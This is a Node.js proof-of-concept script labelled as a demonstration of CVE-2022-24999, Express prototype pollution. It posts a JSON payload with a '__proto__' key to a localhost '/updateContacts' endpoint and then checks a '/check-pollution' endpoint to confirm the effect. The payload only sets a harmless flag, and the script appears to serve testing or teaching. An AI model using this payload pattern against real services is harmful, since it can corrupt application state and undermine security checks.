const http = require('http');

// Configuration
const HOST = 'localhost';
const PORT = 5003;

// Malicious payload with prototype pollution
const payload = JSON.stringify({
    "region_id": "exploit_test",
    "__proto__": {
        "isExploited": true
    }
});

// Options for the POST request
const options = {
    hostname: HOST,
    port: PORT,
    path: '/updateContacts',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': payload.length
    }
};

// Function to send the exploit payload
function sendExploit() {
    return new Promise((resolve, reject) => {
        console.log('Sending prototype pollution payload...');

        const req = http.request(options, (res) => {
            let data = '';

            res.on('data', (chunk) => {
                data += chunk;
            });

            res.on('end', () => {
                console.log('Response status:', res.statusCode);
                console.log('Response body:', data);
                resolve(true);
            });
        });

        req.on('error', (error) => {
            console.error('Error sending exploit:', error.message);
            reject(error);
        });

        req.write(payload);
        req.end();
    });
}

// Function to check if the exploit worked
function checkExploit() {
    return new Promise((resolve, reject) => {
        console.log('\nChecking if prototype was polluted...');

        http.get(`http://${HOST}:${PORT}/check-pollution`, (res) => {
            let data = '';

            res.on('data', (chunk) => {
                data += chunk;
            });

            res.on('end', () => {
                console.log('Pollution check response:', data);
                resolve(data);
            });
        }).on('error', (error) => {
            console.error('Error checking exploit:', error.message);
            reject(error);
        });
    });
}

// Run the exploit demonstration
async function runExploit() {
    try {
        console.log('=== CVE-2022-24999 Express Prototype Pollution Exploit ===\n');

        // First check current state
        console.log('Checking initial state...');
        await checkExploit();

        // Send the exploit
        await sendExploit();

        // Check if it worked
        console.log('\nChecking if the exploit was successful...');
        await checkExploit();

        console.log('\n=== Exploit demonstration complete ===');
    } catch (error) {
        console.error('Exploit demonstration failed:', error);
    }
}

// Run the exploit
runExploit();